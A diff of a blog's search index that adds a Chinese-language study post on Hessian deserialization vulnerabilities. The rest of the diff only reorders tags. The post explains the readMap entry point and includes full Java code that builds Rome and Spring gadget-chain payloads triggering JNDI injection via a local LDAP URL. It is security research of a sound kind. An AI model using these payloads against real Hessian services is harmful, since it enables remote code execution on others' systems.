@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>Hessian反序列化漏洞</title>
+    <link href="/2020/07/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2020/07/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 无。</p><a id="more"></a><hr><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Hessian 是一个轻量级的 Java 反序列化框架，和 Java 原生的序列化类似，相比起来 Hessian 更加高效并且非常适合二进制数据传输。</p><p>可以在 pom.xml 中加入依赖来使用 Hessian：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.caucho&lt;/groupId&gt;    &lt;artifactId&gt;hessian&lt;/artifactId&gt;    &lt;version&gt;4.0.63&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>简单的序列化和反序列化代码，Data 是个简单的继承序列化接口的类：</p><pre><code class="java">public class App {    public static void main( String[] args ) throws Exception {        Data data = new Data(&quot;Twings&quot;);        ByteArrayOutputStream bos = new ByteArrayOutputStream();        HessianOutput ho = new HessianOutput(bos);        ho.writeObject(data);        byte[] serializedData = bos.toByteArray();        ByteArrayInputStream is = new ByteArrayInputStream(serializedData);        HessianInput hi = new HessianInput(is);        hi.readObject();    }}</code></pre><p>Hessian 不会调用序列化类的 readObject 方法，它会调用 readResolve 方法， 而这个方法一般是用在单例模式中的。</p><p>Hessian 在恢复对象的属性的时候，不会调用该类的 setter，恢复方式是调用 _unsafe.putObject。</p><p>Hessian 会将数据序列化为一个 Map，序列化之后的数据大致如下（URL 编码后）：</p><pre><code>Mt%00%0Astudy.DataS%00%04dataS%00%06Twingsz</code></pre><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><p>Hessian 反序列化同样存在漏洞，不过入口点与 Java 原生序列化的 readObject 方法不同，它的入口点在对 Map 类型反序列化处理时：</p><pre><code class="java">public Object readMap(AbstractHessianInput in) throws IOException {    Map map;    if (_type == null)        map = new HashMap();    else if (_type.equals(Map.class))        map = new HashMap();    else if (_type.equals(SortedMap.class))        map = new TreeMap();    else {        try {            map = (Map) _ctor.newInstance();        } catch (Exception e) {            throw new IOExceptionWrapper(e);        }    }    in.addRef(map);    while (! in.isEnd()) {        map.put(in.readObject(), in.readObject());    }    in.readEnd();    return map;}</code></pre><p>这里会调用 HashMap 的 put 方法，换而言之就是会调用 key 的 hashcode 方法，所以只要找到一条以 hashcode 开始的利用链，就可以完成一次 Hessian 反序列化攻击。</p><p>marshalsec 工具中已经集成了 Hessian 的 5 个 Gadgets，可以使用这个工具直接进行漏洞利用。</p><p>不过这个工具的生成流程着实比较复杂，看起来要麻烦一些。</p><h3 id="Gadgets-Rome"><a href="#Gadgets-Rome" class="headerlink" title="Gadgets - Rome"></a>Gadgets - Rome</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.rometools&lt;/groupId&gt;    &lt;artifactId&gt;rome&lt;/artifactId&gt;    &lt;version&gt;1.7.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;    &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;    &lt;version&gt;1.7.24&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><ol><li>HashMap，put -&gt; hash</li><li>EqualsBean，hashCode -&gt; beanHashCode</li><li>ToStringBean，toString -&gt; getter.invoke</li><li>JdbcRowSetImpl，getDatabaseMetaData -&gt; connect</li><li>JNDI 注入</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可以仿照 apache-commons-collections 的 HashSet 这个 Gadget 的反射生成方式来生成 payload：</p><pre><code class="java">private static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {    Field field = obj.getClass().getDeclaredField(fieldName);    field.setAccessible(true);    field.set(obj, value);}private static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {    Field field = obj.getClass().getDeclaredField(fieldName);    field.setAccessible(true);    return field.get(obj);}public static void main( String[] args ) throws Exception {    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();    jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:1389/Exploit&quot;);    ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);    EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);    HashMap hashMap = new HashMap&lt;&gt;(1);    hashMap.put(&quot;replacement&quot;, &quot;Twings&quot;);    Object[] hashMapTable = (Object[])getFieldValue(hashMap, &quot;table&quot;);    Object hashMapNode = hashMapTable[1];    setFieldValue(hashMapNode, &quot;key&quot;, equalsBean);    ByteArrayOutputStream bos = new ByteArrayOutputStream();    HessianOutput ho = new HessianOutput(bos);    ho.writeObject(hashMap);    byte[] serializedData = bos.toByteArray();    ByteArrayInputStream is = new ByteArrayInputStream(serializedData);    HessianInput hi = new HessianInput(is);    System.out.println(java.net.URLEncoder.encode(new String(serializedData)));    hi.readObject();}</code></pre><h3 id="Gadges-SpringPartiallyComparableAdvisorHolder"><a href="#Gadges-SpringPartiallyComparableAdvisorHolder" class="headerlink" title="Gadges - SpringPartiallyComparableAdvisorHolder"></a>Gadges - SpringPartiallyComparableAdvisorHolder</h3><h4 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h4><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;    &lt;version&gt;5.2.5.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;    &lt;version&gt;1.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;    &lt;version&gt;5.2.5.RELEASE&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h4><ol><li>HashMap，put -&gt; putVal -&gt; equals<br>这里需要 hash 冲突，所以选择两个相同的类</li><li>HotSwappableTargetSource，equals -&gt; equals</li><li>XString，equals -&gt; toString</li><li>PartiallyComparableAdvisorHolder，toString -&gt; getOrder</li><li>AspectJPointcutAdvisor，getOrder -&gt; getOrder</li><li>AspectJAroundAdvice，getOrder -&gt; getOrder</li><li>BeanFactoryAspectInstanceFactory，getOrder -&gt; getType</li><li>SimpleJndiBeanFactory，getType -&gt; doGetType -&gt; doGetSingleton -&gt; lookup</li><li>JNDI 注入</li></ol><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里的生成比较复杂，反射赋值的时候需要从父类中获取 Field，还有则是序列化的时候需要设置允许不继承 Serializable 接口：</p><pre><code class="java">package study;import com.caucho.hessian.io.SerializerFactory;public class AllowNonSerializableFactory extends SerializerFactory {}</code></pre><p>测试代码：</p><pre><code class="java">private static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {    Field field = null;    try {        field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);    }catch ( NoSuchFieldException e ) {        if (!obj.getClass().getSuperclass().equals(Object.class)) {            field = obj.getClass().getSuperclass().getDeclaredField(fieldName);            field.setAccessible(true);        }    }    if (field != null) {        field.set(obj, value);    }}private static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {    Field field = obj.getClass().getDeclaredField(fieldName);    field.setAccessible(true);    return field.get(obj);}private static Object createWithoutConstructor(Class clazz) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {    Constructor constructor = Object.class.getDeclaredConstructor();    constructor.setAccessible(true);    Constructor ctor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);    return ctor.newInstance();}public static void main( String[] args ) throws Exception {    HashMap hashMap = new HashMap&lt;&gt;();    hashMap.put(&quot;replacement1&quot;, &quot;Twings&quot;);    hashMap.put(&quot;replacement2&quot;, &quot;Aluvion&quot;);    SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();    BeanFactoryAspectInstanceFactory beanFactoryAspectInstanceFactory = (BeanFactoryAspectInstanceFactory)createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);    setFieldValue(beanFactoryAspectInstanceFactory, &quot;beanFactory&quot;, simpleJndiBeanFactory);    setFieldValue(beanFactoryAspectInstanceFactory, &quot;name&quot;, &quot;ldap://127.0.0.1:1389/Exploit&quot;);    AbstractAspectJAdvice aspectJAroundAdvice = (AbstractAspectJAdvice)createWithoutConstructor(AspectJAroundAdvice.class);    setFieldValue(aspectJAroundAdvice, &quot;aspectInstanceFactory&quot;, beanFactoryAspectInstanceFactory);    AspectJPointcutAdvisor aspectJPointcutAdvisor = (AspectJPointcutAdvisor)createWithoutConstructor(AspectJPointcutAdvisor.class);    setFieldValue(aspectJPointcutAdvisor, &quot;advice&quot;, aspectJAroundAdvice);    Object partiallyComparableAdvisorHolder = createWithoutConstructor(Class.forName(&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;));    setFieldValue(partiallyComparableAdvisorHolder, &quot;advisor&quot;, aspectJPointcutAdvisor);    HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(partiallyComparableAdvisorHolder);    HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(&quot;rushB&quot;));    Object[] hashMapTable = (Object[])getFieldValue(hashMap, &quot;table&quot;);    Object hashMapNode0 = hashMapTable[5];    setFieldValue(hashMapNode0, &quot;key&quot;, hotSwappableTargetSource1);    Object hashMapNode1 = hashMapTable[10];    setFieldValue(hashMapNode1, &quot;key&quot;, hotSwappableTargetSource2);    ByteArrayOutputStream bos = new ByteArrayOutputStream();    HessianOutput ho = new HessianOutput(bos);    AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();    serializableFactory.setAllowNonSerializable(true);    ho.setSerializerFactory(serializableFactory);    ho.writeObject(hashMap);    byte[] serializedData = bos.toByteArray();    ByteArrayInputStream is = new ByteArrayInputStream(serializedData);    HessianInput hi = new HessianInput(is);    System.out.println(java.net.URLEncoder.encode(new String(serializedData)));    hi.readObject();}</code></pre><h3 id="Gadgets-SpringAbstractBeanFactoryPointcutAdvisor"><a href="#Gadgets-SpringAbstractBeanFactoryPointcutAdvisor" class="headerlink" title="Gadgets - SpringAbstractBeanFactoryPointcutAdvisor"></a>Gadgets - SpringAbstractBeanFactoryPointcutAdvisor</h3><p>与上一条类似，触发 AbstractPointcutAdvisor 的 equals 方法，接上 SimpleJndiBeanFactory 的 getBean 然后进入 lookup，JNDI 注入。</p><h3 id="Gadgets-其他两条"><a href="#Gadgets-其他两条" class="headerlink" title="Gadgets - 其他两条"></a>Gadgets - 其他两条</h3><p>懒得仔细看了，看起来比较简单。</p><hr><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>尝试将 apache commons collections 的利用链修改后使用，结果发现 Map 的反序列化有点问题，利用失败。</p><hr><p>参考文章：</p><p><a href="https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html" target="_blank" rel="noopener">https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html</a></p><p><a href="https://paper.seebug.org/1131" target="_blank" rel="noopener">https://paper.seebug.org/1131</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>MySQL JDBC 客户端反序列化</title>
     <link href="/2020/07/02/MySQL-JDBC-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     <url>/2020/07/02/MySQL-JDBC-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
@@ -345,9 +364,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -423,9 +442,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -446,9 +465,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -467,9 +486,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -488,9 +507,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -551,9 +570,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -574,9 +593,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -595,9 +614,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -616,9 +635,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -637,9 +656,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -719,9 +738,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -780,9 +799,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -803,9 +822,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -824,9 +843,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -864,9 +883,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -885,9 +904,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -925,9 +944,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -946,9 +965,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1150,9 +1169,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
